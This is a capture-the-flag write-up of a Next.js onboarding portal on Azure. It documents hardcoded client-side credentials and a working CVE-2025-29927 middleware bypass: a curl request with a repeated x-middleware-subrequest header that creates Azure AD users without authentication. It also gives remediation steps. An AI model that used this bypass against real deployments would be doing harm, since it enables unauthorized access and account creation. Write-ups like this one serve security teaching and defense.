# MediCloudX Workforce - CTF Challenge Writeup

## Challenge Information
- **Name**: MediCloudX Workforce
- **Hint**: "La actualización puede esperar..." (The update can wait...)
- **Target URL**: https://medicloudx-onboarding-fhkpy2ss.azurewebsites.net
- **Category**: Web / Cloud Security

## Initial Reconnaissance

### 1. Application Discovery
```bash
curl -I https://medicloudx-onboarding-fhkpy2ss.azurewebsites.net
```

**Findings**:
- Application: Next.js-based workforce onboarding portal
- Powered by: Next.js (visible in X-Powered-By header)
- Hosting: Azure Web Apps (azurewebsites.net domain)

### 2. Technology Stack Identification

Accessing `/api/version`:
```json
{
  "nodejs": "v18.20.8",
  "nextjs": "15.2.1",
  "application": {
    "name": "medicloudx-onboarding",
    "version": "1.0.0"
  }
}
```

**Key Finding**: Next.js version 15.2.1 identified

### 3. Authentication Analysis

Explored the login page at `/login` and found hardcoded credentials in the client-side JavaScript:

```javascript
// From /login page JavaScript bundle
"hradmin"==="hradmin" && "MediCloudX2025!"==="MediCloudX2025!"
  ? (document.cookie="auth-token=valid; path=/; max-age=3600", d.push("/"))
  : i("Invalid credentials...")
```

**Credentials Found**:
- Username: `hradmin`
- Password: `MediCloudX2025!`
- Auth mechanism: Client-side cookie `auth-token=valid`

### 4. API Endpoint Discovery

Found primary API endpoint:
- `/api/create-user` - Creates Azure AD user accounts
- Expected to accept POST with JSON body
- Frontend expects to receive: `userPrincipalName`, `displayName`, `tempPassword`

## Vulnerability Analysis

### Initial Testing

Testing POST to `/api/create-user`:
```bash
curl -X POST https://medicloudx-onboarding-fhkpy2ss.azurewebsites.net/api/create-user \
  -H "Content-Type: application/json" \
  -d '{}'
```

**Result**: HTTP 307 - Redirect to /login (Not authenticated)

### Discrepancy Discovery

Observed that:
1. Frontend JavaScript expects POST to work
2. Server returns 307/405 for POST requests
3. This suggested a middleware authentication layer

### Vulnerability Research

**Next.js 15.2.1** is vulnerable to:
**CVE-2025-29927: Middleware Authorization Bypass**

**Description**: A security vulnerability in Next.js versions affected by this CVE allows attackers to bypass middleware security checks by manipulating the `x-middleware-subrequest` header.

**Exploitation Method**: Sending the header `x-middleware-subrequest` with specific patterns can bypass authentication middleware.

## Exploitation

### CVE-2025-29927 Bypass Header

The bypass requires sending the following header:
```
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
```

This is 5 repetitions of `src/middleware` joined by colons.

### Successful Exploit

```bash
curl -X POST 'https://medicloudx-onboarding-fhkpy2ss.azurewebsites.net/api/create-user' \
  -H 'x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware' \
  -H 'Content-Type: application/json' \
  -d '{}'
```

**Response**:
```json
{
  "id": "uuid-here",
  "userPrincipalName": "ctf-user-xxxxx@ekocloudsec.com",
  "displayName": "CTF User xxxxx",
  "tempPassword": "RandomPassword123!",
  "forceChangePasswordNextSignIn": true
}
```

**Status**: HTTP 201 Created ✓

### Testing Different Repetition Counts

| Repetitions | Result |
|-------------|--------|
| 1-4 | HTTP 405 - Method Not Allowed |
| 5+ | HTTP 201 - Success |

The vulnerability requires exactly 5 or more repetitions to bypass the middleware.

## Challenge Interpretation

### The Hint: "La actualización puede esperar..."

Possible interpretations:
1. **"The update can wait"** - Refers to deferring the Next.js security update
2. The application is running an outdated/vulnerable version
3. The challenge is about finding and exploiting a version-specific vulnerability

### Connection to CVE-2025-29927

The hint connects to the vulnerability because:
- Next.js 15.2.1 has a known security update available
- Organizations might defer updating ("the update can wait")
- This creates a window of vulnerability for this specific CVE
- The challenge demonstrates the risk of not applying security updates promptly

## Impact Assessment

### Vulnerability Impact

**Severity**: Critical

**Attack Vector**: Network
- No authentication required
- Exploitable remotely via HTTP requests
- No user interaction needed

**Impact**:
1. **Authentication Bypass**: Complete bypass of middleware authentication
2. **Unauthorized User Creation**: Create Azure AD accounts without authorization
3. **Privilege Escalation**: Create users in corporate Azure AD tenant
4. **Data Exposure**: Access to protected API endpoints

### Exploitation Proof

Successfully demonstrated:
- ✓ Bypassed authentication middleware
- ✓ Created users without valid credentials
- ✓ Accessed protected `/api/create-user` endpoint
- ✓ Generated valid Azure AD user accounts

## Technical Deep Dive

### How the Vulnerability Works

1. **Normal Request Flow**:
   ```
   Client Request → Middleware (Auth Check) → Route Handler
                      ↓ (Fail)
                    Redirect to /login
   ```

2. **Exploited Request Flow**:
   ```
   Client Request + Special Header → Middleware (BYPASSED) → Route Handler
                                                                ↓
                                                           Success!
   ```

3. **The Magic Header**:
   ```
   x-middleware-subrequest: src/middleware:src/middleware:...(5x)
   ```

   This header tricks Next.js into treating the request as an internal subrequest,
   causing it to skip middleware validation.

### Why 5 Repetitions?

Through testing, determined that:
- 1-4 repetitions: Middleware still enforces authentication
- 5+ repetitions: Middleware is bypassed

This suggests a threshold or loop count in the Next.js middleware handling logic.

## Remediation

### Immediate Actions

1. **Update Next.js**: Upgrade to patched version (> 15.2.1)
   ```bash
   npm install next@latest
   ```

2. **Add Header Validation**: Implement additional validation
   ```javascript
   // middleware.ts
   export function middleware(request) {
     // Reject suspicious headers
     if (request.headers.get('x-middleware-subrequest')) {
       return new Response('Forbidden', { status: 403 });
     }
     // ... rest of middleware
   }
   ```

3. **Implement Defense in Depth**:
   - Add authentication at route handler level (not just middleware)
   - Implement rate limiting
   - Add logging for suspicious requests

### Long-term Solutions

1. Keep dependencies updated
2. Subscribe to security advisories
3. Implement automated vulnerability scanning
4. Regular security audits

## Files Created

All analysis files located in: `/media/p0mb3r0/4tb/CTF/alpacactf/medicloudx_workforce/`

- `FINAL_EXPLOIT.py` - Complete exploit script
- `recon.py` - Initial reconnaissance
- `test_*.py` - Various testing scripts
- `scripts/` - Downloaded JavaScript files

## Tools Used

- curl
- Python 3 + requests library
- BeautifulSoup4
- Bash scripting

## Timeline

1. Initial reconnaissance → Found Next.js application
2. Version identification → Next.js 15.2.1
3. Authentication analysis → Found hardcoded credentials
4. API testing → Discovered middleware blocking
5. Vulnerability research → Identified CVE-2025-29927
6. Exploit development → Successfully bypassed authentication
7. Impact demonstration → Created users without authorization

## Conclusion

Successfully identified and exploited CVE-2025-29927 in Next.js 15.2.1, demonstrating
how deferring security updates ("La actualización puede esperar") can lead to
critical vulnerabilities being exploited.

The challenge effectively teaches:
- Importance of keeping frameworks updated
- Reconnaissance and version identification
- CVE research and exploitation
- Web application security testing methodology

---

**Author**: CTF Participant
**Date**: 2025-11-21
**Challenge**: MediCloudX Workforce
**Status**: Vulnerability Exploited Successfully
